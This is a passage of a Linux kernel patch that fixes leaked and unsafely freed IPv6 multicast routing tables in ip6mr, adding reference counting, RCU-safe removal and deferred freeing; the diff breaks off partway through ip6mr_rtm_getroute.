+publishes it. After MRT6_DONE or socket close, ip6mr_sk_done() clears
+the routing state but leaves the empty table linked from mr6_tables, so
+repeated MRT6_TABLE(fresh id) -> MRT6_INIT -> MRT6_DONE/close cycles
+accumulate detached tables until netns teardown.
+
+Simply freeing the table from ip6mr_sk_done() is not safe because
+lookups, getsockopt/ioctl paths and multicast data paths can still hold
+RCU references to the published table.
+
+Fix this by keeping MRT6_TABLE as a pure selector, adding refcounted
+lifetime pins for runtime users, removing empty non-default tables from
+the published set with list_del_rcu() after socket teardown, and
+deferring the final free to process context when the last reference
+drops outside RTNL. Hold the netns while the table exists so deferred
+destruction cannot outlive it.
+
+Fixes: d1db275dd3f6 ("ipv6: ip6mr: support multiple tables")
+Cc: stable@vger.kernel.org
+Reported-by: Vega <vega@nebusec.ai>
+Assisted-by: Codex:gpt-5.4
+Signed-off-by: Zihan Xi <zihanx@nebusec.ai>
+Signed-off-by: Ren Wei <enjou1224z@gmail.com>
+---
+ include/linux/mroute_base.h |   6 +
+ net/ipv4/ipmr_base.c        |   6 +-
+ net/ipv6/ip6mr.c            | 328 +++++++++++++++++++++++++++---------
+ 3 files changed, 258 insertions(+), 82 deletions(-)
+
+diff --git a/include/linux/mroute_base.h b/include/linux/mroute_base.h
+index 4d55827e970..536fa324620 100644
+--- a/include/linux/mroute_base.h
++++ b/include/linux/mroute_base.h
+@@ -2,8 +2,10 @@
+ #define __LINUX_MROUTE_BASE_H
+ 
+ #include <linux/netdevice.h>
++#include <linux/refcount.h>
+ #include <linux/rhashtable-types.h>
+ #include <linux/spinlock.h>
++#include <linux/workqueue.h>
+ #include <net/net_namespace.h>
+ #include <net/sock.h>
+ #include <net/fib_notifier.h>
+@@ -242,6 +244,8 @@ struct mr_table_ops {
+  * @mroute_do_assert: Whether to inform userspace on wrong ingress
+  * @mroute_do_pim: Whether to receive IGMP PIMv1
+  * @mroute_reg_vif_num: PIM-device vif index
++ * @refcnt: lifetime pins for this table
++ * @destroy_work: process-context cleanup before final RCU free
+  */
+ struct mr_table {
+ 	struct rcu_work		work;
+@@ -261,6 +265,8 @@ struct mr_table {
+ 	bool			mroute_do_pim;
+ 	bool			mroute_do_wrvifwhole;
+ 	int			mroute_reg_vif_num;
++	refcount_t		refcnt;
++	struct work_struct	destroy_work;
+ };
+ 
+ static inline bool mr_can_free_table(struct net *net)
+diff --git a/net/ipv4/ipmr_base.c b/net/ipv4/ipmr_base.c
+index 867b24beded..9710789cfaf 100644
+--- a/net/ipv4/ipmr_base.c
++++ b/net/ipv4/ipmr_base.c
+@@ -32,8 +32,10 @@ static void __mr_free_table(struct work_struct *work)
+ {
+ 	struct mr_table *mrt = container_of(to_rcu_work(work),
+ 					    struct mr_table, work);
++	struct net *net = read_pnet(&mrt->net);
+ 
+ 	rhltable_destroy(&mrt->mfc_hash);
++	put_net(net);
+ 	kfree(mrt);
+ }
+ 
+@@ -56,11 +58,12 @@ mr_table_alloc(struct net *net, u32 id,
+ 	if (!mrt)
+ 		return ERR_PTR(-ENOMEM);
+ 	mrt->id = id;
+-	write_pnet(&mrt->net, net);
++	write_pnet(&mrt->net, get_net(net));
+ 
+ 	mrt->ops = *ops;
+ 	err = rhltable_init(&mrt->mfc_hash, mrt->ops.rht_params);
+ 	if (err) {
++		put_net(read_pnet(&mrt->net));
+ 		kfree(mrt);
+ 		return ERR_PTR(err);
+ 	}
+@@ -72,6 +75,7 @@ mr_table_alloc(struct net *net, u32 id,
+ 	timer_setup(&mrt->ipmr_expire_timer, expire_func, 0);
+ 
+ 	mrt->mroute_reg_vif_num = -1;
++	refcount_set(&mrt->refcnt, 1);
+ 	table_set(mrt, net);
+ 	return mrt;
+ }
+diff --git a/net/ipv6/ip6mr.c b/net/ipv6/ip6mr.c
+index 604a5883890..94bb00bdff9 100644
+--- a/net/ipv6/ip6mr.c
++++ b/net/ipv6/ip6mr.c
+@@ -87,6 +87,11 @@ static struct kmem_cache *mrt_cachep __read_mostly;
+ static struct mr_table *ip6mr_new_table(struct net *net, u32 id);
+ static void ip6mr_free_table(struct mr_table *mrt,
+ 			     struct list_head *dev_kill_list);
++static void ip6mr_free_table_work(struct work_struct *work);
++static struct mr_table *ip6mr_get_table_hold(struct net *net, u32 id);
++static void ip6mr_put_table(struct mr_table *mrt);
++static void __ip6mr_put_table(struct mr_table *mrt,
++			      struct list_head *dev_kill_list);
+ 
+ static void ip6_mr_forward(struct net *net, struct mr_table *mrt,
+ 			   struct net_device *dev, struct sk_buff *skb,
+@@ -179,7 +184,7 @@ static int ip6mr_rule_action(struct fib_rule *rule, struct flowi *flp,
+ 
+ 	arg->table = fib_rule_get_table(rule, arg);
+ 
+-	mrt = __ip6mr_get_table(rule->fr_net, arg->table);
++	mrt = ip6mr_get_table_hold(rule->fr_net, arg->table);
+ 	if (!mrt)
+ 		return -EAGAIN;
+ 	res->mrt = mrt;
+@@ -271,7 +276,8 @@ static void __net_exit ip6mr_rules_exit_rtnl(struct net *net,
+ 
+ 	list_for_each_entry_safe(mrt, next, &net->ipv6.mr6_tables, list) {
+ 		list_del_rcu(&mrt->list);
+-		ip6mr_free_table(mrt, dev_kill_list);
++		synchronize_rcu();
++		__ip6mr_put_table(mrt, dev_kill_list);
+ 	}
+ }
+ 
+@@ -314,7 +320,7 @@ static struct mr_table *__ip6mr_get_table(struct net *net, u32 id)
+ static int ip6mr_fib_lookup(struct net *net, struct flowi6 *flp6,
+ 			    struct mr_table **mrt)
+ {
+-	*mrt = rcu_dereference(net->ipv6.mrt6);
++	*mrt = ip6mr_get_table_hold(net, RT6_TABLE_DFLT);
+ 	if (!*mrt)
+ 		return -EAGAIN;
+ 	return 0;
+@@ -342,7 +348,8 @@ static void __net_exit ip6mr_rules_exit_rtnl(struct net *net,
+ 	struct mr_table *mrt = rcu_dereference_protected(net->ipv6.mrt6, 1);
+ 
+ 	RCU_INIT_POINTER(net->ipv6.mrt6, NULL);
+-	ip6mr_free_table(mrt, dev_kill_list);
++	synchronize_rcu();
++	__ip6mr_put_table(mrt, dev_kill_list);
+ }
+ 
+ static int ip6mr_rules_dump(struct net *net, struct notifier_block *nb,
+@@ -368,6 +375,44 @@ static struct mr_table *ip6mr_get_table(struct net *net, u32 id)
+ 	return mrt;
+ }
+ 
++static struct mr_table *ip6mr_get_table_hold(struct net *net, u32 id)
++{
++	struct mr_table *mrt;
++
++	rcu_read_lock();
++	mrt = __ip6mr_get_table(net, id);
++	if (mrt && !refcount_inc_not_zero(&mrt->refcnt))
++		mrt = NULL;
++	rcu_read_unlock();
++
++	return mrt;
++}
++
++static void __ip6mr_put_table(struct mr_table *mrt,
++			      struct list_head *head)
++{
++	struct list_head *dev_kill_list;
++	LIST_HEAD(local_dev_kill_list);
++
++	if (!refcount_dec_and_test(&mrt->refcnt))
++		return;
++
++	if (!lockdep_rtnl_is_held()) {
++		schedule_work(&mrt->destroy_work);
++		return;
++	}
++
++	dev_kill_list = head ? head : &local_dev_kill_list;
++	ip6mr_free_table(mrt, dev_kill_list);
++	if (!head)
++		unregister_netdevice_many(dev_kill_list);
++}
++
++static void ip6mr_put_table(struct mr_table *mrt)
++{
++	__ip6mr_put_table(mrt, NULL);
++}
++
+ static int ip6mr_hash_cmp(struct rhashtable_compare_arg *arg,
+ 			  const void *ptr)
+ {
+@@ -413,8 +458,12 @@ static struct mr_table *ip6mr_new_table(struct net *net, u32 id)
+ 	if (mrt)
+ 		return mrt;
+ 
+-	return mr_table_alloc(net, id, &ip6mr_mr_table_ops,
+-			      ipmr_expire_process, ip6mr_new_table_set);
++	mrt = mr_table_alloc(net, id, &ip6mr_mr_table_ops,
++			     ipmr_expire_process, ip6mr_new_table_set);
++	if (!IS_ERR(mrt))
++		INIT_WORK(&mrt->destroy_work, ip6mr_free_table_work);
++
++	return mrt;
+ }
+ 
+ static void ip6mr_free_table(struct mr_table *mrt,
+@@ -423,8 +472,6 @@ static void ip6mr_free_table(struct mr_table *mrt,
+ 	struct net *net = read_pnet(&mrt->net);
+ 	LIST_HEAD(ip6mr_dev_kill_list);
+ 
+-	WARN_ON_ONCE(!mr_can_free_table(net));
+-
+ 	timer_shutdown_sync(&mrt->ipmr_expire_timer);
+ 	mroute_clean_tables(mrt, MRT6_FLUSH_MIFS | MRT6_FLUSH_MIFS_STATIC |
+ 			    MRT6_FLUSH_MFC | MRT6_FLUSH_MFC_STATIC,
+@@ -436,6 +483,17 @@ static void ip6mr_free_table(struct mr_table *mrt,
+ 	list_splice(&ip6mr_dev_kill_list, dev_kill_list);
+ }
+ 
++static void ip6mr_free_table_work(struct work_struct *work)
++{
++	struct mr_table *mrt = container_of(work, struct mr_table, destroy_work);
++	LIST_HEAD(dev_kill_list);
++
++	rtnl_lock();
++	ip6mr_free_table(mrt, &dev_kill_list);
++	unregister_netdevice_many(&dev_kill_list);
++	rtnl_unlock();
++}
++
+ #ifdef CONFIG_PROC_FS
+ /* The /proc interfaces to multicast routing
+  * /proc/ip6_mr_cache /proc/ip6_mr_vif
+@@ -569,7 +627,7 @@ static int pim6_rcv(struct sk_buff *skb)
+ 	struct ipv6hdr   *encap;
+ 	struct net_device  *reg_dev = NULL;
+ 	struct net *net = dev_net(skb->dev);
+-	struct mr_table *mrt;
++	struct mr_table *mrt = NULL;
+ 	struct flowi6 fl6 = {
+ 		.flowi6_iif	= skb->dev->ifindex,
+ 		.flowi6_mark	= skb->mark,
+@@ -617,9 +675,12 @@ static int pim6_rcv(struct sk_buff *skb)
+ 	skb_tunnel_rx(skb, reg_dev, dev_net(reg_dev));
+ 
+ 	netif_rx(skb);
++	ip6mr_put_table(mrt);
+ 
+ 	return 0;
+  drop:
++	if (mrt)
++		ip6mr_put_table(mrt);
+ 	kfree_skb(skb);
+ 	return 0;
+ }
+@@ -634,7 +695,7 @@ static netdev_tx_t reg_vif_xmit(struct sk_buff *skb,
+ 				      struct net_device *dev)
+ {
+ 	struct net *net = dev_net(dev);
+-	struct mr_table *mrt;
++	struct mr_table *mrt = NULL;
+ 	struct flowi6 fl6 = {
+ 		.flowi6_oif	= dev->ifindex,
+ 		.flowi6_iif	= skb->skb_iif ? : LOOPBACK_IFINDEX,
+@@ -655,12 +716,15 @@ static netdev_tx_t reg_vif_xmit(struct sk_buff *skb,
+ 	ip6mr_cache_report(mrt, skb, READ_ONCE(mrt->mroute_reg_vif_num),
+ 			   MRT6MSG_WHOLEPKT);
+ 	rcu_read_unlock();
++	ip6mr_put_table(mrt);
+ 	kfree_skb(skb);
+ 	return NETDEV_TX_OK;
+ 
+ tx_lookup_err:
+ 	rcu_read_unlock();
+ tx_err:
++	if (mrt)
++		ip6mr_put_table(mrt);
+ 	DEV_STATS_INC(dev, tx_errors);
+ 	kfree_skb(skb);
+ 	return NETDEV_TX_OK;
+@@ -1615,12 +1679,13 @@ static void mroute_clean_tables(struct mr_table *mrt, int flags,
+ 	}
+ }
+ 
+-static int ip6mr_sk_init(struct mr_table *mrt, struct sock *sk)
++static int __ip6mr_sk_init(struct mr_table *mrt, struct sock *sk)
+ {
+ 	int err = 0;
+ 	struct net *net = sock_net(sk);
+ 
+-	rtnl_lock();
++	ASSERT_RTNL();
++
+ 	spin_lock(&mrt_lock);
+ 	if (rtnl_dereference(mrt->mroute_sk)) {
+ 		err = -EADDRINUSE;
+@@ -1628,6 +1693,7 @@ static int ip6mr_sk_init(struct mr_table *mrt, struct sock *sk)
+ 		rcu_assign_pointer(mrt->mroute_sk, sk);
+ 		sock_set_flag(sk, SOCK_RCU_FREE);
+ 		atomic_inc(&net->ipv6.devconf_all->mc_forwarding);
++		refcount_inc(&mrt->refcnt);
+ 	}
+ 	spin_unlock(&mrt_lock);
+ 
+@@ -1636,7 +1702,6 @@ static int ip6mr_sk_init(struct mr_table *mrt, struct sock *sk)
+ 					     NETCONFA_MC_FORWARDING,
+ 					     NETCONFA_IFINDEX_ALL,
+ 					     net->ipv6.devconf_all);
+-	rtnl_unlock();
+ 
+ 	return err;
+ }
+@@ -1646,6 +1711,7 @@ int ip6mr_sk_done(struct sock *sk)
+ 	struct net *net = sock_net(sk);
+ 	struct ipv6_devconf *devconf;
+ 	LIST_HEAD(dev_kill_list);
++	struct mr_table *free_mrt = NULL;
+ 	struct mr_table *mrt;
+ 	int err = -EACCES;
+ 
+@@ -1675,6 +1741,15 @@ int ip6mr_sk_done(struct sock *sk)
+ 
+ 			mroute_clean_tables(mrt, MRT6_FLUSH_MIFS | MRT6_FLUSH_MFC,
+ 					    &dev_kill_list);
++			if (mrt->id != RT6_TABLE_DFLT &&
++			    !READ_ONCE(mrt->maxvif) &&
++			    !READ_ONCE(mrt->cache_resolve_queue_len) &&
++			    list_empty(&mrt->mfc_cache_list) &&
++			    list_empty(&mrt->mfc_unres_queue) &&
++			    READ_ONCE(mrt->mroute_reg_vif_num) < 0) {
++				list_del_rcu(&mrt->list);
++				free_mrt = mrt;
++			}
+ 			err = 0;
+ 			break;
+ 		}
+@@ -1682,6 +1757,14 @@ int ip6mr_sk_done(struct sock *sk)
+ 	unregister_netdevice_many(&dev_kill_list);
+ 	rtnl_unlock();
+ 
++	if (!err)
++		ip6mr_put_table(mrt);
++
++	if (free_mrt) {
++		synchronize_rcu();
++		ip6mr_put_table(free_mrt);
++	}
++
+ 	return err;
+ }
+ 
+@@ -1693,11 +1776,15 @@ bool mroute6_is_socket(struct net *net, struct sk_buff *skb)
+ 		.flowi6_oif	= skb->dev->ifindex,
+ 		.flowi6_mark	= skb->mark,
+ 	};
++	bool ret;
+ 
+ 	if (ip6mr_fib_lookup(net, &fl6, &mrt) < 0)
+ 		return NULL;
+ 
+-	return rcu_access_pointer(mrt->mroute_sk);
++	ret = rcu_access_pointer(mrt->mroute_sk);
++	ip6mr_put_table(mrt);
++
++	return ret;
+ }
+ EXPORT_SYMBOL(mroute6_is_socket);
+ 
+@@ -1716,20 +1803,24 @@ int ip6_mroute_setsockopt(struct sock *sk, int optname, sockptr_t optval,
+ 	struct mf6cctl mfc;
+ 	mifi_t mifi;
+ 	struct net *net = sock_net(sk);
+-	struct mr_table *mrt;
++	struct mr_table *mrt = NULL;
++	u32 table = raw6_sk(sk)->ip6mr_table ? : RT6_TABLE_DFLT;
+ 
+ 	if (sk->sk_type != SOCK_RAW ||
+ 	    inet_sk(sk)->inet_num != IPPROTO_ICMPV6)
+ 		return -EOPNOTSUPP;
+ 
+-	mrt = ip6mr_get_table(net, raw6_sk(sk)->ip6mr_table ? : RT6_TABLE_DFLT);
+-	if (!mrt)
+-		return -ENOENT;
+-
+-	if (optname != MRT6_INIT) {
++	if (optname != MRT6_INIT &&
++	    optname != MRT6_TABLE &&
++	    optname != MRT6_DONE) {
++		mrt = ip6mr_get_table_hold(net, table);
++		if (!mrt)
++			return -ENOENT;
+ 		if (sk != rcu_access_pointer(mrt->mroute_sk) &&
+-		    !ns_capable(net->user_ns, CAP_NET_ADMIN))
++		    !ns_capable(net->user_ns, CAP_NET_ADMIN)) {
++			ip6mr_put_table(mrt);
+ 			return -EACCES;
++		}
+ 	}
+ 
+ 	switch (optname) {
+@@ -1737,32 +1828,41 @@ int ip6_mroute_setsockopt(struct sock *sk, int optname, sockptr_t optval,
+ 		if (optlen < sizeof(int))
+ 			return -EINVAL;
+ 
+-		return ip6mr_sk_init(mrt, sk);
++		rtnl_lock();
++		mrt = ip6mr_new_table(net, table);
++		if (!IS_ERR(mrt))
++			ret = __ip6mr_sk_init(mrt, sk);
++		else
++			ret = PTR_ERR(mrt);
++		rtnl_unlock();
++		return ret;
+ 
+ 	case MRT6_DONE:
+ 		return ip6mr_sk_done(sk);
+ 
+ 	case MRT6_ADD_MIF:
+ 		if (optlen < sizeof(vif))
+-			return -EINVAL;
++			goto out_put_table_einval;
+ 		if (copy_from_sockptr(&vif, optval, sizeof(vif)))
+-			return -EFAULT;
++			goto out_put_table_efault;
+ 		if (vif.mif6c_mifi >= MAXMIFS)
+-			return -ENFILE;
++			goto out_put_table_enfile;
+ 		rtnl_lock();
+ 		ret = mif6_add(net, mrt, &vif,
+ 			       sk == rtnl_dereference(mrt->mroute_sk));
+ 		rtnl_unlock();
++		ip6mr_put_table(mrt);
+ 		return ret;
+ 
+ 	case MRT6_DEL_MIF:
+ 		if (optlen < sizeof(mifi_t))
+-			return -EINVAL;
++			goto out_put_table_einval;
+ 		if (copy_from_sockptr(&mifi, optval, sizeof(mifi_t)))
+-			return -EFAULT;
++			goto out_put_table_efault;
+ 		rtnl_lock();
+ 		ret = mif6_delete(mrt, mifi, 0, NULL);
+ 		rtnl_unlock();
++		ip6mr_put_table(mrt);
+ 		return ret;
+ 
+ 	/*
+@@ -1776,9 +1876,9 @@ int ip6_mroute_setsockopt(struct sock *sk, int optname, sockptr_t optval,
+ 	case MRT6_ADD_MFC_PROXY:
+ 	case MRT6_DEL_MFC_PROXY:
+ 		if (optlen < sizeof(mfc))
+-			return -EINVAL;
++			goto out_put_table_einval;
+ 		if (copy_from_sockptr(&mfc, optval, sizeof(mfc)))
+-			return -EFAULT;
++			goto out_put_table_efault;
+ 		if (parent == 0)
+ 			parent = mfc.mf6cc_parent;
+ 
+@@ -1793,6 +1893,7 @@ int ip6_mroute_setsockopt(struct sock *sk, int optname, sockptr_t optval,
+ 					    parent);
+ 
+ 		mutex_unlock(&net->ipv6.mfc_mutex);
++		ip6mr_put_table(mrt);
+ 		return ret;
+ 
+ 	case MRT6_FLUSH:
+@@ -1801,14 +1902,15 @@ int ip6_mroute_setsockopt(struct sock *sk, int optname, sockptr_t optval,
+ 		int flags;
+ 
+ 		if (optlen != sizeof(flags))
+-			return -EINVAL;
++			goto out_put_table_einval;
+ 		if (copy_from_sockptr(&flags, optval, sizeof(flags)))
+-			return -EFAULT;
++			goto out_put_table_efault;
+ 
+ 		rtnl_lock();
+ 		mroute_clean_tables(mrt, flags, &dev_kill_list);
+ 		unregister_netdevice_many(&dev_kill_list);
+ 		rtnl_unlock();
++		ip6mr_put_table(mrt);
+ 		return 0;
+ 	}
+ 
+@@ -1820,10 +1922,11 @@ int ip6_mroute_setsockopt(struct sock *sk, int optname, sockptr_t optval,
+ 		int v;
+ 
+ 		if (optlen != sizeof(v))
+-			return -EINVAL;
++			goto out_put_table_einval;
+ 		if (copy_from_sockptr(&v, optval, sizeof(v)))
+-			return -EFAULT;
++			goto out_put_table_efault;
+ 		WRITE_ONCE(mrt->mroute_do_assert, v);
++		ip6mr_put_table(mrt);
+ 		return 0;
+ 	}
+ 
+@@ -1834,9 +1937,9 @@ int ip6_mroute_setsockopt(struct sock *sk, int optname, sockptr_t optval,
+ 		int v;
+ 
+ 		if (optlen != sizeof(v))
+-			return -EINVAL;
++			goto out_put_table_einval;
+ 		if (copy_from_sockptr(&v, optval, sizeof(v)))
+-			return -EFAULT;
++			goto out_put_table_efault;
+ 
+ 		do_wrmifwhole = (v == MRT6MSG_WRMIFWHOLE);
+ 		v = !!v;
+@@ -1848,6 +1951,7 @@ int ip6_mroute_setsockopt(struct sock *sk, int optname, sockptr_t optval,
+ 			WRITE_ONCE(mrt->mroute_do_wrvifwhole, do_wrmifwhole);
+ 		}
+ 		rtnl_unlock();
++		ip6mr_put_table(mrt);
+ 		return ret;
+ 	}
+ 
+@@ -1864,18 +1968,22 @@ int ip6_mroute_setsockopt(struct sock *sk, int optname, sockptr_t optval,
+ 		/* "pim6reg%u" should not exceed 16 bytes (IFNAMSIZ) */
+ 		if (v != RT_TABLE_DEFAULT && v >= 100000000)
+ 			return -EINVAL;
+-		if (sk == rcu_access_pointer(mrt->mroute_sk))
++
++		mrt = ip6mr_get_table_hold(net, table);
++		if (mrt && sk == rcu_access_pointer(mrt->mroute_sk)) {
++			ip6mr_put_table(mrt);
+ 			return -EBUSY;
++		}
++		if (!ns_capable(net->user_ns, CAP_NET_ADMIN)) {
++			if (mrt)
++				ip6mr_put_table(mrt);
++			return -EACCES;
++		}
++		if (mrt)
++			ip6mr_put_table(mrt);
+ 
+-		rtnl_lock();
+-		ret = 0;
+-		mrt = ip6mr_new_table(net, v);
+-		if (IS_ERR(mrt))
+-			ret = PTR_ERR(mrt);
+-		else
+-			raw6_sk(sk)->ip6mr_table = v;
+-		rtnl_unlock();
+-		return ret;
++		raw6_sk(sk)->ip6mr_table = v;
++		return 0;
+ 	}
+ #endif
+ 	/*
+@@ -1883,8 +1991,25 @@ int ip6_mroute_setsockopt(struct sock *sk, int optname, sockptr_t optval,
+ 	 *	set.
+ 	 */
+ 	default:
++		if (mrt)
++			ip6mr_put_table(mrt);
+ 		return -ENOPROTOOPT;
+ 	}
++
++out_put_table_efault:
++	if (mrt)
++		ip6mr_put_table(mrt);
++	return -EFAULT;
++
++out_put_table_einval:
++	if (mrt)
++		ip6mr_put_table(mrt);
++	return -EINVAL;
++
++out_put_table_enfile:
++	if (mrt)
++		ip6mr_put_table(mrt);
++	return -ENFILE;
+ }
+ 
+ /*
+@@ -1895,6 +2020,7 @@ int ip6_mroute_getsockopt(struct sock *sk, int optname, sockptr_t optval,
+ 			  sockptr_t optlen)
+ {
+ 	int olr;
++	int ret = 0;
+ 	int val;
+ 	struct net *net = sock_net(sk);
+ 	struct mr_table *mrt;
+@@ -1903,7 +2029,7 @@ int ip6_mroute_getsockopt(struct sock *sk, int optname, sockptr_t optval,
+ 	    inet_sk(sk)->inet_num != IPPROTO_ICMPV6)
+ 		return -EOPNOTSUPP;
+ 
+-	mrt = ip6mr_get_table(net, raw6_sk(sk)->ip6mr_table ? : RT6_TABLE_DFLT);
++	mrt = ip6mr_get_table_hold(net, raw6_sk(sk)->ip6mr_table ? : RT6_TABLE_DFLT);
+ 	if (!mrt)
+ 		return -ENOENT;
+ 
+@@ -1920,26 +2046,33 @@ int ip6_mroute_getsockopt(struct sock *sk, int optname, sockptr_t optval,
+ 		val = READ_ONCE(mrt->mroute_do_assert);
+ 		break;
+ 	default:
+-		return -ENOPROTOOPT;
++		ret = -ENOPROTOOPT;
++		goto out;
+ 	}
+ 
+-	if (copy_from_sockptr(&olr, optlen, sizeof(int)))
+-		return -EFAULT;
++	if (copy_from_sockptr(&olr, optlen, sizeof(int))) {
++		ret = -EFAULT;
++		goto out;
++	}
+ 
+ 	olr = min_t(int, olr, sizeof(int));
+-	if (olr < 0)
+-		return -EINVAL;
++	if (olr < 0) {
++		ret = -EINVAL;
++		goto out;
++	}
+ 
+-	if (copy_to_sockptr(optlen, &olr, sizeof(int)))
+-		return -EFAULT;
+-	if (copy_to_sockptr(optval, &val, olr))
+-		return -EFAULT;
+-	return 0;
++	if (copy_to_sockptr(optlen, &olr, sizeof(int)) ||
++	    copy_to_sockptr(optval, &val, olr))
++		ret = -EFAULT;
++out:
++	ip6mr_put_table(mrt);
++	return ret;
+ }
+ 
+ /*
+  *	The IP multicast ioctl support routines.
+  */
++
+ int ip6mr_ioctl(struct sock *sk, int cmd, void *arg)
+ {
+ 	struct sioc_sg_req6 *sr;
+@@ -1949,7 +2082,7 @@ int ip6mr_ioctl(struct sock *sk, int cmd, void *arg)
+ 	struct net *net = sock_net(sk);
+ 	struct mr_table *mrt;
+ 
+-	mrt = ip6mr_get_table(net, raw6_sk(sk)->ip6mr_table ? : RT6_TABLE_DFLT);
++	mrt = ip6mr_get_table_hold(net, raw6_sk(sk)->ip6mr_table ? : RT6_TABLE_DFLT);
+ 	if (!mrt)
+ 		return -ENOENT;
+ 
+@@ -1957,7 +2090,7 @@ int ip6mr_ioctl(struct sock *sk, int cmd, void *arg)
+ 	case SIOCGETMIFCNT_IN6:
+ 		vr = (struct sioc_mif_req6 *)arg;
+ 		if (vr->mifi >= mrt->maxvif)
+-			return -EINVAL;
++			goto out_put_table_einval;
+ 		vr->mifi = array_index_nospec(vr->mifi, mrt->maxvif);
+ 		rcu_read_lock();
+ 		vif = &mrt->vif_table[vr->mifi];
+@@ -1967,9 +2100,11 @@ int ip6mr_ioctl(struct sock *sk, int cmd, void *arg)
+ 			vr->ibytes = READ_ONCE(vif->bytes_in);
+ 			vr->obytes = READ_ONCE(vif->bytes_out);
+ 			rcu_read_unlock();
++			ip6mr_put_table(mrt);
+ 			return 0;
+ 		}
+ 		rcu_read_unlock();
++		ip6mr_put_table(mrt);
+ 		return -EADDRNOTAVAIL;
+ 	case SIOCGETSGCNT_IN6:
+ 		sr = (struct sioc_sg_req6 *)arg;
+@@ -1982,15 +2117,21 @@ int ip6mr_ioctl(struct sock *sk, int cmd, void *arg)
+ 			sr->bytecnt = atomic_long_read(&c->_c.mfc_un.res.bytes);
+ 			sr->wrong_if = atomic_long_read(&c->_c.mfc_un.res.wrong_if);
+ 			rcu_read_unlock();
++			ip6mr_put_table(mrt);
+ 			return 0;
+ 		}
+ 		rcu_read_unlock();
++		ip6mr_put_table(mrt);
+ 		return -EADDRNOTAVAIL;
+ 	default:
++		ip6mr_put_table(mrt);
+ 		return -ENOIOCTLCMD;
+ 	}
+-}
+ 
++out_put_table_einval:
++	ip6mr_put_table(mrt);
++	return -EINVAL;
++}
+ #ifdef CONFIG_COMPAT
+ struct compat_sioc_sg_req6 {
+ 	struct sockaddr_in6 src;
+@@ -2017,16 +2158,16 @@ int ip6mr_compat_ioctl(struct sock *sk, unsigned int cmd, void __user *arg)
+ 	struct net *net = sock_net(sk);
+ 	struct mr_table *mrt;
+ 
+-	mrt = ip6mr_get_table(net, raw6_sk(sk)->ip6mr_table ? : RT6_TABLE_DFLT);
++	mrt = ip6mr_get_table_hold(net, raw6_sk(sk)->ip6mr_table ? : RT6_TABLE_DFLT);
+ 	if (!mrt)
+ 		return -ENOENT;
+ 
+ 	switch (cmd) {
+ 	case SIOCGETMIFCNT_IN6:
+ 		if (copy_from_user(&vr, arg, sizeof(vr)))
+-			return -EFAULT;
++			goto out_put_table_efault;
+ 		if (vr.mifi >= mrt->maxvif)
+-			return -EINVAL;
++			goto out_put_table_einval;
+ 		vr.mifi = array_index_nospec(vr.mifi, mrt->maxvif);
+ 		rcu_read_lock();
+ 		vif = &mrt->vif_table[vr.mifi];
+@@ -2038,14 +2179,16 @@ int ip6mr_compat_ioctl(struct sock *sk, unsigned int cmd, void __user *arg)
+ 			rcu_read_unlock();
+ 
+ 			if (copy_to_user(arg, &vr, sizeof(vr)))
+-				return -EFAULT;
++				goto out_put_table_efault;
++			ip6mr_put_table(mrt);
+ 			return 0;
+ 		}
+ 		rcu_read_unlock();
++		ip6mr_put_table(mrt);
+ 		return -EADDRNOTAVAIL;
+ 	case SIOCGETSGCNT_IN6:
+ 		if (copy_from_user(&sr, arg, sizeof(sr)))
+-			return -EFAULT;
++			goto out_put_table_efault;
+ 
+ 		rcu_read_lock();
+ 		c = ip6mr_cache_find(mrt, &sr.src.sin6_addr, &sr.grp.sin6_addr);
+@@ -2056,14 +2199,25 @@ int ip6mr_compat_ioctl(struct sock *sk, unsigned int cmd, void __user *arg)
+ 			rcu_read_unlock();
+ 
+ 			if (copy_to_user(arg, &sr, sizeof(sr)))
+-				return -EFAULT;
++				goto out_put_table_efault;
++			ip6mr_put_table(mrt);
+ 			return 0;
+ 		}
+ 		rcu_read_unlock();
++		ip6mr_put_table(mrt);
+ 		return -EADDRNOTAVAIL;
+ 	default:
++		ip6mr_put_table(mrt);
+ 		return -ENOIOCTLCMD;
+ 	}
++
++out_put_table_efault:
++	ip6mr_put_table(mrt);
++	return -EFAULT;
++
++out_put_table_einval:
++	ip6mr_put_table(mrt);
++	return -EINVAL;
+ }
+ #endif
+ 
+@@ -2392,13 +2546,16 @@ int ip6_mr_input(struct sk_buff *skb)
+ 		if (vif >= 0) {
+ 			int err = ip6mr_cache_unresolved(mrt, vif, skb, dev);
+ 
++			ip6mr_put_table(mrt);
+ 			return err;
+ 		}
++		ip6mr_put_table(mrt);
+ 		kfree_skb(skb);
+ 		return -ENODEV;
+ 	}
+ 
+ 	ip6_mr_forward(net, mrt, dev, skb, cache);
++	ip6mr_put_table(mrt);
+ 
+ 	return 0;
+ }
+@@ -2441,19 +2598,25 @@ int ip6_mr_output(struct net *net, struct sock *sk, struct sk_buff *skb)
+ 	/* No usable cache entry */
+ 	if (!cache) {
+ 		vif = ip6mr_find_vif(mrt, dev);
+-		if (vif >= 0)
+-			return ip6mr_cache_unresolved(mrt, vif, skb, dev);
+-		goto ip6_output;
++		if (vif >= 0) {
++			err = ip6mr_cache_unresolved(mrt, vif, skb, dev);
++			ip6mr_put_table(mrt);
++			return err;
++		}
++		goto out_put;
+ 	}
+ 
+ 	/* Wrong interface */
+ 	vif = cache->_c.mfc_parent;
+ 	if (rcu_access_pointer(mrt->vif_table[vif].dev) != dev)
+-		goto ip6_output;
++		goto out_put;
+ 
+ 	ip6_mr_output_finish(net, mrt, dev, skb, cache);
++	ip6mr_put_table(mrt);
+ 	return 0;
+ 
++out_put:
++	ip6mr_put_table(mrt);
+ ip6_output:
+ 	return ip6_output(net, sk, skb);
+ }
+@@ -2755,33 +2918,35 @@ static int ip6mr_rtm_getroute(struct sk_buff *in_skb, struct nlmsghdr *nlh,
+ 		grp = nla_get_in6_addr(tb[RTA_DST]);
+ 	tableid = nla_get_u32_default(tb[RTA_TABLE], 0);
+ 
+-	rcu_read_lock();
+-
+-	mrt = __ip6mr_get_table(net, tableid ?: RT_TABLE_DEFAULT);
++	mrt = ip6mr_get_table_hold(net, tableid ?: RT_TABLE_DEFAULT);
+ 	if (!mrt) {
+ 		NL_SET_ERR_MSG_MOD(extack, "MR table does not exist");
+ 		err = -ENOENT;
+-		goto err;
++		goto err_free;
+ 	}
+ 
++	rcu_read_lock();
+ 	cache = ip6mr_cache_find(mrt, &src, &grp);
+ 	if (!cache) {
++		rcu_read_unlock();
+ 		NL_SET_ERR_MSG_MOD(extack, "MR cache entry not found");
+ 		err = -ENOENT;
+-		goto err;
++		goto err_put;
+ 	}
+ 
